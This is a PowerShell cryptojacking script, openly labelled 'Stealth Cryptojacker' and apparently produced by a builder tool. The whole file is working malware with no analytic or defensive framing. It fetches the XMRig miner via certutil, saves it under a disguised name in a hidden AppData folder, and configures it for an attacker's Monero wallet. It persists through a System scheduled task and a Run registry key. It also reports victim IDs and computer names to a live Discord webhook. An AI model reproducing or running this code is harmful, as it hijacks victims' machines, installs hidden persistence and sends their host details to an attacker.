# Stealth Cryptojacker - Generated 04/21/2026 16:42:07
$victimId = "X" + [guid]::NewGuid().ToString("N").Substring(0,12)
$webhook = "https://discord.com/api/webhooks/1496255549434495136/jgM852mfkGNtqrvM1OMxbBcchVylx20ew7FY_cwSg-gkpA5YbU1L2FspdVeWD-hs47Ie"
$wallet = "84Ejdr CHKvzY WH6n1N sXVx7P 7z23up EXuXZx dwQXe6 nahdyg ZCKwjY b4M3q5 XBdL6Q VAyXUG fWdg5C WsxZdw erqHHt h2rRQ"

function Send-Report { param([string]$m) 
    try { 
        $b = @{content=$m} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $webhook -Method Post -Body $b -ContentType "application/json" | Out-Null 
    } catch {} 
}

Send-Report "REPORT:$victimId:Init:00h:$env:COMPUTERNAME:Windows"

# Hidden path
$path = "$env:APPDATA\Microsoft\Windows\Themes\CachedFiles"
New-Item -ItemType Directory -Path $path -Force | Out-Null
$minerPath = "$path\svch0st.exe"

certutil -urlcache -split -f "https://github.com/xmrig/xmrig/releases/latest/download/xmrig.exe" $minerPath | Out-Null

$config = '{ "pools": [{"url": "pool.supportxmr.com:3333", "user": "' + $wallet + '", "pass": "x"}], "cpu": {"max-threads-hint": 45}, "background": true }'
$config | Out-File "$path\config.json" -Encoding utf8

schtasks /create /tn "ThemeCache" /tr "$minerPath -c $path\config.json" /sc onlogon /ru System /f | Out-Null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ThemeCache" /t REG_SZ /d "$minerPath -c $path\config.json" /f | Out-Null

Start-Process $minerPath -ArgumentList "-c $path\config.json" -WindowStyle Hidden

Send-Report "REPORT:$victimId:MinerActive:00h:$env:COMPUTERNAME:Windows"

while ($true) {
    Start-Sleep -Seconds (Get-Random -Minimum 240 -Maximum 480)
    Send-Report "REPORT:$victimId:Active:29.5 KH/s:Running:$env:COMPUTERNAME:Windows"
}
